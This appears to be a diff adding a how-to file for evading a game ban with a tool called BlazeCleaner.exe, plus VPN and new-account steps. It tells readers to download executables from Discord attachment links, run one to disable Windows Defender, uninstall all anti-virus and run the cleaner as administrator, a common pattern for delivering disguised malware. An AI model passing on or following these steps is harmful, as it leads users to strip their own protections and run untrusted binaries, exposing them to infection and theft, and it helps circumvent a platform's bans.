@@ -1,0 +1,41 @@
+Install This:  https://cdn.discordapp.com/attachments/722447597456851014/723954322391564398/Install_if_error.exe
+
+Install This And Click Disable Defender: https://cdn.discordapp.com/attachments/722447597456851014/723954789490360411/DEFENDERCONTROL.EXE
+
+Uninstall All Anti-virus such as Malwarebytes
+
+Install this FREE VPN: https://protonvpn.com/
+
+
+1. Run BlazeCleaner.exe as Admin and press Y and enter when it asks to reset adapters
+
+2. Restart PC 
+
+3. Run BlazeCleaner.exe as Admin again and press N and enter when it asks to reset adapters
+
+4. Download Steam if you dont have it already
+
+5. Go to the Libary option on steam then click add game at the bottom left and add Epic Games Launcher
+
+
+6. Open your VPN and connect
+
+
+7. Open Epic games through steam everytime you play 
+
+8. Make a new account and repeat these steps if you get kicked/banned in the future
+
+9. Enjoy
+
+
+No internet after cleaning?
+
+Go into device managar
+Go to network adapters
+Find the one with the yellow mark
+Click update
+Browse on PC
+Click one
+Install
+Wait 10 seconds
+Fixed
